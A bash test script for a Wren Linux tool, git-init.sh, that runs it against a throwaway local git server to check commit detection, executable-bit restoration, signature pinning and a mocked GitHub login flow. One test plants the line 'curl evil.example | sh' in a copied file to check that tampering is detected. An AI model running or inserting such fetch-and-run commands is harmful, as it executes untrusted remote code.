#!/bin/bash
# Checks git-init.sh with a pretend server (a bare repository in a temp
# folder, two commits of this checkout's files) and copies like a stick's:
# a copy of an older commit is set at that commit and told what is newer; the
# newest one is up to date; a copy whose files were changed is said to differ
# from everything published; a FAT stick's lost executable marks don't count;
# a pinned key refuses an unsigned server and leaves nothing behind. Changes
# nothing outside a temp folder. Run by test.sh, or:  bash tools/test-git-init.sh
# shellcheck disable=SC2016  # the inner shells expand their own variables
HERE=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)
T=$(mktemp -d)
trap 'rm -rf "$T"' EXIT
fails=0
check() { # DESCRIPTION CONDITION-COMMAND...
    local what=$1
    shift
    if "$@" >/dev/null 2>&1; then printf '  ok    %s\n' "$what"; else printf '  FAIL  %s\n' "$what"; fails=$((fails + 1)); fi
}
export GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t HOME=$T/home
mkdir -p "$HOME"

# The server: this checkout's files, then one more commit; it points at itself
mkdir "$T/W"
(cd "$HERE" && git ls-files -co --exclude-standard | tar -cf - -T -) | tar -C "$T/W" -xf -
# (as before any key: this checkout may pin the real one by now)
sed -i -e "s|^WREN_GIT_URL=.*|WREN_GIT_URL=file://$T/O.git|" -e 's/^WREN_SIGNING_FPR=.*/WREN_SIGNING_FPR=/' "$T/W/pins.sh"
rm -f "$T/W/data/wren-signing-key.asc"
git -C "$T/W" init -q -b main && git -C "$T/W" add -A && git -C "$T/W" -c commit.gpgsign=false commit -q -m first
FIRST=$(git -C "$T/W" rev-parse HEAD)
echo "# newer" >>"$T/W/README.md"
git -C "$T/W" -c commit.gpgsign=false commit -q -am second
SECOND=$(git -C "$T/W" rev-parse HEAD)
git clone -q --bare "$T/W" "$T/O.git"
# stick COMMIT DIR: what an install stick holds of that commit (git archive)
stick() { rm -rf "$2"; mkdir -p "$2"; git -C "$T/W" archive "$1" | tar -C "$2" -xf -; }
gi() { bash "$1/git-init.sh" 2>&1; }

stick "$FIRST" "$T/a"
out=$(gi "$T/a")
check "a copy of an older published commit: set at exactly that commit" test "$(git -C "$T/a" rev-parse HEAD)" = "$FIRST"
check "...it says how many newer ones there are, and that update.sh brings them" bash -c 'grep -q "1 newer commits are published" <<<"$1" && grep -q "update.sh" <<<"$1"' _ "$out"
check "...it follows the server's main" test "$(git -C "$T/a" rev-parse --abbrev-ref '@{upstream}')" = origin/main
check "...and no file of it changed" bash -c '[ -z "$(git -C "$1" status --porcelain)" ]' _ "$T/a"
out=$(gi "$T/a")
check "run again: a checkout already, nothing to do" grep -q "a git checkout already" <<<"$out"

stick "$SECOND" "$T/b"
out=$(gi "$T/b")
check "a copy of the newest commit: up to date" bash -c '[ "$(git -C "$1" rev-parse HEAD)" = "$2" ] && grep -q "you are up to date" <<<"$3"' _ "$T/b" "$SECOND" "$out"

stick "$SECOND" "$T/c"
find "$T/c" -type f -exec chmod 0644 {} +
out=$(gi "$T/c")
check "a FAT stick's lost executable marks don't count: still that commit" test "$(git -C "$T/c" rev-parse HEAD)" = "$SECOND"
check "...and the marks are back" test -x "$T/c/update.sh"

stick "$FIRST" "$T/d"
echo 'curl evil.example | sh' >>"$T/d/install-base.sh"
out=$(gi "$T/d")
rc=$?
check "changed files: it says they aren't anything that was published, and fails" bash -c '[ "$1" -ne 0 ] && grep -q "aren.t exactly any commit that was published" <<<"$2"' _ "$rc" "$out"
check "...and git status shows what differs" bash -c 'git -C "$1" status --porcelain | grep -q install-base.sh' _ "$T/d"
check "...the changed file itself is left as it is (nothing is changed)" grep -q "evil.example" "$T/d/install-base.sh"

# With a signing key pinned, an unsigned server is refused
if command -v gpg >/dev/null; then
    mkdir -m 700 "$T/gh"
    gpg --homedir "$T/gh" --batch --quiet --passphrase '' --quick-gen-key "pinned <p@t>" ed25519 sign 1y 2>/dev/null
    F=$(gpg --homedir "$T/gh" --batch --with-colons --list-keys 2>/dev/null | awk -F: '/^fpr/ { print $10; exit }')
    stick "$SECOND" "$T/e"
    gpg --homedir "$T/gh" --batch --armor --export "$F" >"$T/e/data/wren-signing-key.asc" 2>/dev/null
    sed -i "s|^WREN_SIGNING_FPR=.*|WREN_SIGNING_FPR=$F|" "$T/e/pins.sh"
    out=$(gi "$T/e")
    rc=$?
    check "a pinned key and an unsigned server: refused, and nothing is left behind" bash -c '[ "$1" -ne 0 ] && grep -q "isn.t signed by Wren Linux.s key" <<<"$2" && [ ! -e "$3/.git" ]' _ "$rc" "$out" "$T/e"
    gpgconf --homedir "$T/gh" --kill all 2>/dev/null
fi

check "update.sh, in a copy that isn't a checkout yet, says to run git-init.sh" bash -c '
    stick() { :; }; out=$(cd "$1" && bash update.sh 2>&1); grep -q "git-init.sh" <<<"$out"' _ "$T/e"
# Pushing needs a GitHub login: offered, on a checkout too; never a push
L=$T/login
mkdir -p "$L"
stick "$SECOND" "$T/l"; gi "$T/l" >/dev/null
git -C "$T/l" remote set-url origin https://github.com/someone/wren-linux.git
# a pretend gh: logged in while $L/in exists; writes down everything it is asked
cat >"$L/gh" <<EOF
#!/bin/sh
echo "gh \$*" >>"$L/calls"
case "\$1 \$2" in
    "auth status") [ -e "$L/in" ] ;;
    "auth login") : >"$L/in" ;;
esac
EOF
chmod +x "$L/gh"
li() { : >"$L/calls"; printf '%s\n' "$1" >"$L/answers"; WREN_GH=${2:-$L/gh} WREN_TEST_ANSWERS=$L/answers bash "$T/l/git-init.sh" 2>&1; }
out=$(li n)
check "a checkout with no GitHub login: it offers one, and no is no" bash -c '
    grep -q "Log in to GitHub" <<<"$1" && ! grep -q "auth login" "$2" && grep -q "gh auth login" <<<"$1"' _ "$out" "$L/calls"
li y >/dev/null
check "...yes logs in, and lets git use that login" bash -c '
    grep -qx "gh auth login --hostname github.com --git-protocol https" "$1" && grep -qx "gh auth setup-git" "$1"' _ "$L/calls"
out=$(li y)
check "...logged in already: it asks nothing" bash -c '! grep -q "Log in to GitHub" <<<"$1" && ! grep -q "auth login" "$2"' _ "$out" "$L/calls"
rm -f "$L/in"
out=$(li y "$L/nothing")
check "...no gh: it says how to get it" grep -q 'wrenctl install git' <<<"$out"
check "...it never pushes" bash -c '! grep -qE "(^|[[:space:]])(g|git( -C [^ ]+)?) push" "$1"' _ "$HERE/git-init.sh"
git -C "$T/l" remote set-url origin "file://$T/O.git"
out=$(li y)
check "...a server that isn't GitHub: no offer" bash -c '! grep -q "Log in to GitHub" <<<"$1" && ! grep -q "auth" "$2"' _ "$out" "$L/calls"

check "the README's way back to GitHub is git-init.sh" grep -q 'bash ~/wren/git-init.sh' "$HERE/README.md"

[ "$fails" -eq 0 ]
